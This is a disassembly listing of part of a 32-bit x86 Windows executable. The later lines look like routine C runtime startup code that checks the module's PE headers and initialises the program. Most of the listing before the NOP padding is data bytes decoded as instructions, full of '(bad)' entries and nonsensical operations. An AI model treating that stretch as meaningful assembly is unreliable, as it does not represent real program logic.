  42231a:	add    DWORD PTR [ecx+0x799fd675],ecx
  422320:	inc    esi
  422321:	fld    QWORD PTR [eax]
  422323:	add    ecx,DWORD PTR [esi-0x156c361c]
  422329:	or     al,0xd3
  42232b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42232c:	arpl   WORD PTR [eax-0x3458f51d],cx
  422332:	and    BYTE PTR [edi],0x1b
  422335:	add    al,0xf6
  422337:	rcr    BYTE PTR cs:[esi+0x2f4b4a7e],0x62
  42233f:	leave  
  422340:	popf   
  422341:	sub    al,0xa1
  422343:	iret   
  422344:	data16 add dl,bh
  422347:	loopne 0x4222df
  422349:	mov    ?,ebx
  42234b:	jns    0x422318
  42234d:	shl    eax,0xb6
  422350:	push   0x7a
  422352:	(bad)  
  422353:	rol    BYTE PTR [edi-0x17aff684],cl
  422359:	loope  0x4223c2
  42235b:	dec    edi
  42235c:	xchg   esi,eax
  42235d:	cs mov esi,0xa420bfef
  422363:	aad    0x7
  422365:	je     0x422315
  422367:	stos   DWORD PTR es:[edi],eax
  422368:	mov    cl,0xea
  42236a:	dec    esp
  42236b:	nop
  42236c:	call   0xf3831e8c
  422371:	not    BYTE PTR [eax]
  422373:	int3   
  422374:	in     al,0xd3
  422376:	or     BYTE PTR [ebx-0x3a],ah
  422379:	xlat   BYTE PTR ds:[ebx]
  42237a:	inc    edi
  42237b:	jo     0x422302
  42237d:	outs   dx,DWORD PTR ds:[esi]
  42237e:	rcr    BYTE PTR gs:[edx+0x7a],0xa
  422383:	adc    ebx,DWORD PTR [edi+0x281b5bdc]
  422389:	lahf   
  42238a:	and    dl,BYTE PTR [eax]
  42238c:	fsub   QWORD PTR [edx+esi*2+0x3a]
  422390:	sbb    al,0x8e
  422392:	stos   BYTE PTR es:[edi],al
  422393:	js     0x4223f7
  422395:	pop    edx
  422396:	cmp    ebp,0x28458938
  42239c:	sub    DWORD PTR [edi],ebx
  42239e:	xchg   esi,eax
  42239f:	sbb    ch,BYTE PTR [edi]
  4223a1:	pusha  
  4223a2:	cmc    
  4223a3:	add    DWORD PTR [eax],ecx
  4223a5:	cmp    ch,BYTE PTR [edi-0xc]
  4223a8:	mov    ah,0xb0
  4223aa:	stos   DWORD PTR es:[edi],eax
  4223ab:	out    0x25,al
  4223ad:	add    DWORD PTR [ebp+0x2c3f6b36],0xffffff96
  4223b4:	mov    dh,0x60
  4223b6:	adc    eax,0xffb851b7
  4223bb:	pop    DWORD PTR [edi-0x4f92a5f0]
  4223c1:	add    ah,BYTE PTR [edx-0x7261ae41]
  4223c7:	mov    bl,0x57
  4223c9:	add    eax,DWORD PTR [edi]
  4223cb:	sbb    esi,DWORD PTR [ecx-0x68]
  4223ce:	add    BYTE PTR [esi],bh
  4223d0:	fist   DWORD PTR [ebp-0x77]
  4223d3:	maxps  xmm3,XMMWORD PTR [edi-0x62]
  4223d7:	jge    0x42240a
  4223d9:	jecxz  0x4223ab
  4223db:	fnstenv [edi-0x58699e67]
  4223e1:	or     DWORD PTR [edi+0x60],edx
  4223e4:	jae    0x4223d9
  4223e6:	stc    
  4223e7:	inc    esi
  4223e8:	push   esp
  4223e9:	cmp    cl,BYTE PTR [ebp+0x2c28424f]
  4223ef:	call   0x68a:0x74d954a7
  4223f6:	mov    al,ds:0xb5248c0a
  4223fb:	cmc    
  4223fc:	mov    ch,0x7a
  4223fe:	mov    ecx,0x48ebbbd0
  422403:	imul   esi,DWORD PTR [eax+0x44],0xac6cc5a5
  42240a:	stc    
  42240b:	dec    edi
  42240c:	test   BYTE PTR ds:0x9e651f9a,bh
  422412:	retf   0x97c3
  422415:	cmp    cl,al
  422417:	jne    0x4223f6
  422419:	jmp    0xd86c008b
  42241e:	add    BYTE PTR [esi+esi*8-0x12],0x49
  422423:	mov    al,ds:0xa76fcb91
  422428:	repnz fstp st(1)
  42242b:	dec    eax
  42242c:	(bad)  
  42242d:	push   edx
  42242e:	jae    0x422431
  422430:	call   0x35933ad4
  422435:	nop
  422436:	dec    eax
  422437:	into   
  422438:	dec    ebx
  422439:	sbb    edi,DWORD PTR [ecx+0x25eec4]
  42243f:	(bad)  
  422440:	and    DWORD PTR [edi-0x1b],edi
  422443:	mov    esp,0x849b449c
  422448:	pop    eax
  422449:	(bad)  
  42244b:	mov    eax,0x83da7e77
  422450:	fild   WORD PTR [edx+0x64]
  422453:	sub    eax,0xd602bb63
  422458:	outs   dx,DWORD PTR ds:[esi]
  422459:	rcr    ch,cl
  42245b:	stc    
  42245c:	jo     0x422454
  42245e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42245f:	dec    edi
  422460:	cmp    ch,al
  422462:	cld    
  422463:	leave  
  422464:	aad    0x56
  422466:	push   ecx
  422467:	jb     0x422410
  422469:	sahf   
  42246a:	js     0x4224cc
  42246c:	and    al,cl
  42246e:	jae    0x422474
  422470:	inc    eax
  422471:	pop    esp
  422472:	xchg   esi,eax
  422473:	daa    
  422474:	inc    edi
  422475:	fwait
  422476:	iret   
  422477:	mov    bh,BYTE PTR fs:[edx+0x560a1f6b]
  42247e:	add    ebx,esp
  422480:	mov    edi,0x7e36005
  422485:	sbb    BYTE PTR [esi-0x5d4c19bc],0xf2
  42248c:	mov    edx,0x8f7fdac8
  422491:	add    DWORD PTR [ebx-0x60],edi
  422494:	and    al,0xcb
  422496:	sub    DWORD PTR [edi+edi*1-0x28],esi
  42249a:	sbb    al,0x61
  42249c:	xor    al,0x1d
  42249e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249f:	(bad)  
  4224a0:	int    0x76
  4224a2:	xchg   ebp,eax
  4224a3:	test   bl,dh
  4224a5:	or     bh,BYTE PTR ds:0x63620932
  4224ab:	(bad)  
  4224ac:	xchg   BYTE PTR [ecx-0x6a],dl
  4224af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224b0:	jg     0x422510
  4224b2:	ss push es
  4224b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224b5:	call   0xf0d1edff
  4224ba:	adc    dh,dl
  4224bc:	cmp    BYTE PTR [ecx],bh
  4224be:	outs   dx,DWORD PTR ds:[esi]
  4224bf:	inc    edi
  4224c0:	aam    0x6c
  4224c2:	sbb    edx,DWORD PTR [esi-0x27403d22]
  4224c8:	push   ecx
  4224c9:	(bad)
  4224cc:	or     edi,DWORD PTR [edx]
  4224ce:	pop    esi
  4224cf:	mov    al,0xd0
  4224d1:	arpl   WORD PTR [ebx+eax*1-0x71cd377c],ax
  4224d8:	addr16 mov esi,0x1f1657f8
  4224de:	sbb    al,0xf7
  4224e0:	into   
  4224e1:	loopne 0x42246f
  4224e3:	call   0x3665:0x1816d6
  4224ea:	test   DWORD PTR [ebp+0x40ad47ef],ebp
  4224f0:	aaa    
  4224f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224f2:	and    al,0x98
  4224f4:	enter  0x6a30,0x5
  4224f8:	imul   esp,DWORD PTR [ecx],0x6a
  4224fb:	cmp    DWORD PTR [ebp+edx*8+0x75],edi
  4224ff:	or     BYTE PTR [ecx-0x34],bh
  422502:	add    dl,BYTE PTR [ebx+ebp*1-0x62]
  422506:	lods   al,BYTE PTR es:[esi]
  422508:	push   esi
  422509:	jl     0x422534
  42250b:	jnp    0x4224d5
  42250d:	lds    eax,FWORD PTR [esi]
  42250f:	mov    ch,0xe0
  422511:	cmp    ecx,ebx
  422513:	mov    ch,BYTE PTR [eax]
  422515:	iret   
  422516:	(bad)  
  422517:	mov    al,0x33
  422519:	cmp    BYTE PTR [esi-0x3],al
  42251c:	mov    esi,0xdf43e8e0
  422521:	sti    
  422522:	and    DWORD PTR [eax-0x600a0f14],eax
  422528:	rcr    BYTE PTR ds:[edi+eax*2],cl
  42252c:	stos   BYTE PTR es:[edi],al
  42252d:	fcom   DWORD PTR [ecx+0x38cf5bc3]
  422533:	jp     0x42251d
  422535:	retf   0xb285
  422538:	mov    esp,0x55176b3b
  42253d:	jp     0x422562
  42253f:	(bad)  
  422540:	jge    0x422516
  422542:	jb     0x4224fa
  422544:	or     al,0x66
  422546:	cmp    al,0x99
  422548:	lods   al,BYTE PTR ds:[esi]
  422549:	fadd   DWORD PTR [ecx+0x324fffc9]
  42254f:	xchg   ebx,eax
  422550:	inc    edi
  422551:	out    0x8b,al
  422553:	jge    0x422597
  422555:	mov    eax,0xec406612
  42255a:	push   eax
  42255b:	imul   ecx,DWORD PTR [esi+ebp*1-0x507e12a6],0x18138579
  422566:	outs   dx,DWORD PTR ds:[esi]
  422567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422568:	xchg   edx,eax
  422569:	arpl   cx,bp
  42256b:	mov    al,BYTE PTR [esi+0x7d]
  42256e:	inc    edx
  42256f:	mov    fs,ebx
  422571:	lahf   
  422572:	cli    
  422573:	dec    ebx
  422574:	cmp    edi,eax
  422576:	xchg   edx,eax
  422577:	jl     0x4225f6
  422579:	imul   edx,DWORD PTR [ebp+0x26b30e4],0xffffffb5
  422580:	mov    dl,0xd2
  422582:	dec    edi
  422583:	in     eax,0x5a
  422585:	sbb    eax,DWORD PTR [ecx+0x7e]
  422588:	es dec edx
  42258a:	mov    eax,ds:0xd4fbccfc
  42258f:	fimul  WORD PTR [esi+0x11]
  422592:	or     al,0xba
  422594:	js     0x422565
  422596:	mov    edi,ds
  422598:	cmp    eax,0x30a4ca
  42259d:	jg     0x4225d2
  42259f:	jae    0x422575
  4225a1:	adc    eax,0x8c42f6ff
  4225a6:	push   eax
  4225a7:	jg     0x422601
  4225a9:	dec    eax
  4225aa:	push   0x34
  4225ac:	stc    
  4225ad:	addr16 dec edi
  4225af:	rol    DWORD PTR [esi+0xc],cl
  4225b2:	or     eax,0x27c61a7a
  4225b7:	lods   al,BYTE PTR ds:[esi]
  4225b8:	nop
  4225b9:	or     DWORD PTR [edx+0xa],ecx
  4225bc:	arpl   WORD PTR [ebx+0x64],dx
  4225bf:	pushf  
  4225c0:	mov    ?,WORD PTR [edx]
  4225c2:	pop    ss
  4225c3:	adc    eax,0x207d60e2
  4225c8:	jmp    0x87ae8d5e
  4225cd:	lock lahf 
  4225cf:	cmp    BYTE PTR [ebp-0x3],ah
  4225d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225d3:	or     edi,0xffffffb0
  4225d6:	xor    ebx,DWORD PTR [ecx]
  4225d8:	scas   al,BYTE PTR es:[edi]
  4225d9:	jb     0x4225b5
  4225db:	(bad)  
  4225dc:	push   eax
  4225dd:	jno    0x42256c
  4225df:	xlat   BYTE PTR ds:[ebx]
  4225e0:	mov    ebp,DWORD PTR [eax]
  4225e2:	dec    ebx
  4225e3:	xchg   ecx,eax
  4225e4:	inc    ebp
  4225e5:	jno    0x422599
  4225e7:	add    eax,0x95ea6b8d
  4225ec:	lea    edi,[esi+edx*2]
  4225ef:	nop    DWORD PTR [edx-0x13]
  4225f3:	sub    DWORD PTR [ebp+edx*8-0x4c52a6c],0x61
  4225fb:	(bad)  
  4225fc:	push   ds
  4225fd:	sbb    ecx,DWORD PTR [esi-0x1a]
  422600:	xchg   BYTE PTR [ecx],cl
  422602:	inc    esp
  422603:	sbb    DWORD PTR [eax-0x3440bb44],esi
  422609:	mov    ah,0xec
  42260b:	sahf   
  42260c:	out    dx,al
  42260d:	pop    eax
  42260e:	call   0x7f9:0xb060bd0f
  422615:	ret    
  422616:	sub    eax,0xefd18d4
  42261b:	xchg   esp,eax
  42261c:	int    0x58
  42261e:	sbb    edx,DWORD PTR [eax+ecx*4+0x6cdee8a1]
  422625:	out    dx,al
  422626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422627:	imul   esp,edx,0xfffffff3
  42262a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42262b:	cmp    cl,BYTE PTR [ecx-0x1fd9fa5e]
  422631:	scas   eax,DWORD PTR es:[edi]
  422632:	rol    DWORD PTR [di-0x7c0d],0x7f
  422638:	push   esp
  422639:	and    DWORD PTR [ebp+0x6c],edi
  42263c:	in     eax,dx
  42263d:	out    0xbf,al
  42263f:	xor    edi,esi
  422641:	dec    edx
  422642:	sbb    BYTE PTR [ebp*4-0x574d6e88],bh
  422649:	ret    0x4a84
  42264c:	in     eax,dx
  42264d:	ret    0x343d
  422650:	jmp    0x422643
  422652:	mov    ch,0x4d
  422654:	out    dx,al
  422655:	adc    al,0x96
  422657:	or     al,0x8d
  422659:	fld    TBYTE PTR [esi]
  42265b:	mov    DWORD PTR [edx+0x2],edi
  42265e:	sub    al,0xb1
  422660:	cmp    esp,DWORD PTR [edi+eiz*1-0x7ac3d788]
  422667:	pop    eax
  422668:	mov    ecx,0x35b68d09
  42266d:	xchg   ecx,eax
  42266e:	adc    esi,ebx
  422670:	xor    DWORD PTR [edx+0xe5d4f2b],0xe
  422677:	cdq    
  422678:	aaa    
  422679:	xor    eax,0xaa2bdac4
  42267e:	pop    edi
  42267f:	shl    BYTE PTR [eax+0x8],1
  422682:	test   al,0x6b
  422684:	or     DWORD PTR [edx],eax
  422686:	scas   al,BYTE PTR es:[edi]
  422687:	out    0x1c,eax
  422689:	xchg   ecx,eax
  42268a:	and    ch,BYTE PTR [esi+edx*1]
  42268d:	inc    eax
  42268e:	call   0xd70d:0xe92ca1bb
  422695:	xchg   edi,eax
  422696:	jmp    0x42267a
  422698:	sub    DWORD PTR [ecx],ebx
  42269a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42269b:	sub    eax,0xf2456492
  4226a0:	mov    bh,0x62
  4226a2:	xchg   ecx,eax
  4226a3:	pop    esp
  4226a4:	sbb    al,BYTE PTR [edx-0x14]
  4226a7:	rol    eax,1
  4226a9:	mov    bh,0xfa
  4226ab:	lds    ebp,FWORD PTR [ebx+edi*2+0xb32ba81]
  4226b2:	pop    esi
  4226b3:	gs popa 
  4226b5:	pop    ebx
  4226b6:	je     0x42264d
  4226b8:	into   
  4226b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ba:	and    eax,0x9eb57034
  4226bf:	ret    0xaf86
  4226c2:	push   ss
  4226c3:	mov    ah,0x6d
  4226c5:	push   ebx
  4226c6:	sar    BYTE PTR [edx-0x614b177],0xfa
  4226cd:	push   ecx
  4226ce:	aaa    
  4226cf:	retf   0xd359
  4226d2:	adc    eax,ebx
  4226d4:	mov    esp,DWORD PTR ds:0xb9bd4814
  4226da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226db:	in     eax,0x68
  4226dd:	inc    ebp
  4226de:	scas   al,BYTE PTR es:[edi]
  4226df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226e0:	inc    edx
  4226e1:	loope  0x4226aa
  4226e3:	in     eax,dx
  4226e4:	ins    DWORD PTR es:[edi],dx
  4226e5:	sti    
  4226e6:	fisubr WORD PTR [ebx]
  4226e8:	jno    0x422698
  4226ea:	push   0xb1a542b4
  4226ef:	(bad)  
  4226f0:	xlat   BYTE PTR ds:[ebx]
  4226f1:	aam    0x80
  4226f3:	mov    ss,WORD PTR [edi+edi*2]
  4226f6:	mov    ebx,DWORD PTR [eax-0x53]
  4226f9:	xor    DWORD PTR [eax-0x3],ebp
  4226fc:	in     eax,0x7e
  4226fe:	jns    0x4226f7
  422700:	mov    ebp,0x952d0147
  422705:	repnz inc ecx
  422707:	or     eax,0x78b40317
  42270c:	xchg   edx,eax
  42270d:	mov    edx,edi
  42270f:	dec    eax
  422710:	aaa    
  422711:	push   cs
  422712:	data16 and bl,BYTE PTR [edi]
  422715:	imul   esp,ebp,0x9622381c
  42271b:	or     ch,BYTE PTR [esp+ebp*8+0x5540db6f]
  422722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422723:	mov    bh,0x14
  422725:	jmp    0x42277a
  422727:	ins    BYTE PTR es:[edi],dx
  422728:	jno    0x42273e
  42272a:	mov    esp,0xe04d7021
  42272f:	push   ebx
  422730:	clc    
  422731:	fiadd  WORD PTR [ecx]
  422733:	mov    dl,0xdd
  422735:	inc    ebx
  422736:	iret   
  422737:	jno    0x4226cd
  422739:	shl    bh,cl
  42273b:	imul   ecx,DWORD PTR [eax-0x5b],0xffffffc4
  42273f:	adc    al,0xc
  422741:	jecxz  0x42279f
  422743:	dec    eax
  422744:	push   ebp
  422745:	mov    eax,ds:0xf61572d5
  42274a:	xor    BYTE PTR [esi-0x79cd3b92],0x2e
  422751:	fabs   
  422753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422754:	hlt    
  422755:	pusha  
  422756:	mov    dh,BYTE PTR [edx+0x7a]
  422759:	hlt    
  42275a:	mov    al,ds:0xa41490e5
  42275f:	xchg   edx,eax
  422760:	mov    ah,0xca
  422762:	mov    eax,edi
  422764:	js     0x4227e3
  422766:	or     ah,BYTE PTR [ebx]
  422768:	imul   ecx,DWORD PTR [ebx],0x5b2310ca
  42276e:	mov    bh,0x52
  422770:	pop    ss
  422771:	popf   
  422772:	mov    es,WORD PTR [edi+esi*4]
  422775:	ins    DWORD PTR es:[edi],dx
  422776:	jae    0x6f195c00
  42277c:	lods   eax,DWORD PTR ds:[esi]
  42277d:	sub    edi,ebx
  42277f:	xlat   BYTE PTR ds:[ebx]
  422780:	int3   
  422781:	pop    esi
  422782:	(bad)  
  422783:	mov    eax,DWORD PTR [edx+0xc7e96ca]
  422789:	mov    ah,ah
  42278b:	and    dl,BYTE PTR [edx+ebp*1-0x6af6c06a]
  422792:	cmp    ecx,edx
  422794:	aaa    
  422795:	pusha  
  422796:	inc    esp
  422797:	inc    edx
  422798:	dec    ecx
  422799:	popa   
  42279a:	xchg   esp,eax
  42279b:	mov    eax,0xa4ebd621
  4227a0:	out    dx,eax
  4227a1:	mov    edi,0xa6ac1fea
  4227a6:	xchg   esp,eax
  4227a7:	push   ebp
  4227a8:	inc    ebp
  4227a9:	xor    ch,bh
  4227ab:	inc    eax
  4227ac:	add    al,0xd1
  4227ae:	jbe    0x42279b
  4227b0:	(bad)  
  4227b2:	and    DWORD PTR [ebx-0x77],eax
  4227b5:	fdiv   QWORD PTR [edi+0x6f449bff]
  4227bb:	ss pop edx
  4227bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227be:	dec    eax
  4227bf:	mov    ds:0xfdc01b71,al
  4227c4:	xchg   BYTE PTR [esi],cl
  4227c6:	repnz outs dx,DWORD PTR ds:[esi]
  4227c8:	jnp    0x4227fa
  4227ca:	mov    edi,0xf6e16e45
  4227cf:	fdiv   st(5),st
  4227d1:	in     eax,dx
  4227d2:	enter  0xd50e,0x50
  4227d6:	sub    bl,BYTE PTR [ecx]
  4227d8:	or     BYTE PTR [eax+edi*4],ah
  4227db:	pushf  
  4227dc:	in     eax,0x16
  4227de:	cmp    BYTE PTR [esi+ebx*1],0xc0
  4227e2:	imul   edx,ebx,0x5de2824d
  4227e8:	scas   al,BYTE PTR es:[edi]
  4227e9:	mov    esp,0x9b725768
  4227ee:	sti    
  4227ef:	jno    0x42280b
  4227f1:	add    dh,bl
  4227f3:	hlt    
  4227f4:	cmp    dh,bl
  4227f6:	ss aas 
  4227f8:	mov    esi,0x42f0fb4b
  4227fd:	pop    ds
  4227fe:	or     al,0xec
  422800:	jnp    0x42285c
  422802:	and    edi,edx
  422804:	retf   0x2e79
  422807:	aam    0x6b
  422809:	adc    bh,BYTE PTR [ecx+ebp*2+0x47]
  42280d:	sahf   
  42280e:	sbb    eax,0x341c3c90
  422813:	(bad)  
  422814:	and    eax,0x1ca329d5
  422819:	or     eax,0xad9a568c
  42281e:	xchg   DWORD PTR ss:[ecx],ebx
  422821:	cmp    eax,0x62f0fcdf
  422826:	inc    esp
  422827:	fiadd  WORD PTR [eax-0x7470f0f9]
  42282d:	outs   dx,BYTE PTR ds:[esi]
  42282e:	or     al,0x27
  422830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422831:	xchg   ecx,eax
  422832:	mov    al,ds:0xea6399ff
  422837:	sti    
  422838:	pushf  
  422839:	daa    
  42283a:	dec    edx
  42283b:	jge    0x4227e0
  42283d:	pop    ecx
  42283e:	add    al,0xe7
  422840:	sub    BYTE PTR [eax],al
  422842:	test   BYTE PTR [ebx-0x44],0xb6
  422846:	jno    0x422893
  422848:	mov    edi,esp
  42284a:	and    bh,ch
  42284c:	adc    eax,0x3821115
  422851:	jbe    0x4228c3
  422853:	pop    ebp
  422854:	(bad)  [ebx-0x3c05391]
  42285a:	(bad)  
  42285b:	pushaw 
  42285d:	push   edx
  42285e:	test   BYTE PTR [ebx+0x668cd076],ah
  422864:	popf   
  422865:	mov    bh,0x14
  422867:	inc    edx
  422868:	mov    dl,0xd6
  42286a:	pop    ecx
  42286b:	mov    ebx,0xa6de7d63
  422870:	popa   
  422871:	pop    esi
  422872:	sti    
  422873:	rcl    ch,cl
  422875:	(bad)  
  422876:	icebp  
  422877:	icebp  
  422878:	ror    DWORD PTR [eax],0xd6
  42287b:	pop    eax
  42287c:	cdq    
  42287d:	sbb    DWORD PTR [edi+0x73],esi
  422880:	cld    
  422881:	daa    
  422882:	sub    dl,BYTE PTR [ebx-0x4d]
  422885:	mov    eax,ds:0xbbbb2687
  42288a:	mov    edx,0x862ec494
  42288f:	jns    0x422852
  422891:	push   ebx
  422892:	std    
  422893:	in     al,0xd5
  422895:	or     BYTE PTR ds:0xc8483368,cl
  42289b:	mov    bh,0x93
  42289d:	xchg   DWORD PTR [ebp-0x60c57154],eax
  4228a3:	nop
  4228a4:	cwde   
  4228a5:	or     ebp,DWORD PTR [edi+edi*8+0x7f520000]
  4228ac:	xchg   ebx,eax
  4228ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ae:	mov    bh,0xe1
  4228b0:	cld    
  4228b1:	xchg   edi,eax
  4228b2:	outs   dx,DWORD PTR ds:[esi]
  4228b3:	popf   
  4228b4:	and    eax,0x694a800d
  4228b9:	(bad)  
  4228ba:	xchg   edi,eax
  4228bb:	sbb    dl,cl
  4228bd:	mov    bl,0xbf
  4228bf:	fcmovne st,st(3)
  4228c1:	(bad)  
  4228c2:	mov    edi,0x6f6e6980
  4228c7:	pop    esi
  4228c8:	hlt    
  4228c9:	jmp    0x5558:0x4a571eae
  4228d0:	outs   dx,DWORD PTR ds:[esi]
  4228d1:	xchg   ebp,eax
  4228d2:	idiv   ebx
  4228d4:	push   ecx
  4228d5:	or     ah,cl
  4228d7:	ret    
  4228d8:	rcl    BYTE PTR [ebx+0xd378ccf],0xea
  4228df:	ins    DWORD PTR es:[edi],dx
  4228e0:	jge    0x42295a
  4228e2:	or     eax,DWORD PTR [esi]
  4228e4:	mov    esp,0x4001d300
  4228e9:	call   0xf4140acd
  4228ee:	lods   eax,DWORD PTR ds:[esi]
  4228ef:	imul   ebx,DWORD PTR [ebx],0x97aefb5
  4228f5:	int3   
  4228f6:	stc    
  4228f7:	mov    bl,0xf2
  4228f9:	mov    gs,ecx
  4228fb:	sub    DWORD PTR [eax+eax*4],esp
  4228fe:	pop    ss
  4228ff:	leave  
  422900:	ins    BYTE PTR es:[edi],dx
  422901:	aad    0x9f
  422903:	or     ah,dl
  422905:	iret   
  422906:	cmp    esp,DWORD PTR [ebx+0x7e]
  422909:	add    eax,0x30d97d3
  42290e:	and    DWORD PTR [edi-0x23],ebp
  422911:	cmp    edx,DWORD PTR [eax-0x15]
  422914:	lock cmp edi,DWORD PTR [ebp+0x53]
  422918:	sbb    DWORD PTR [eax+0x14e76212],ecx
  42291e:	inc    edi
  42291f:	push   esi
  422920:	clc    
  422921:	mov    bl,0x5a
  422923:	sub    al,ah
  422925:	gs test dh,0xa2
  422929:	push   es
  42292a:	jg     0x422975
  42292c:	(bad)  
  42292d:	call   0x2146359d
  422932:	es push edx
  422934:	popf   
  422935:	mov    cl,0x9d
  422937:	jb     0x42297d
  422939:	in     eax,0xc9
  42293b:	dec    esi
  42293c:	sbb    BYTE PTR [ecx+0x19],bl
  42293f:	add    edi,DWORD PTR [ecx-0x7c]
  422942:	popa   
  422943:	add    eax,0xadb2df72
  422948:	fstp   TBYTE PTR [edi+0x1f]
  42294b:	mov    eax,0x7ad5bd4a
  422950:	push   ebx
  422951:	mov    cl,0x5b
  422953:	or     eax,0x941fde7a
  422958:	sub    DWORD PTR [ecx-0x3b7c3fcd],edx
  42295e:	adc    dl,al
  422960:	adc    BYTE PTR [eax],al
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
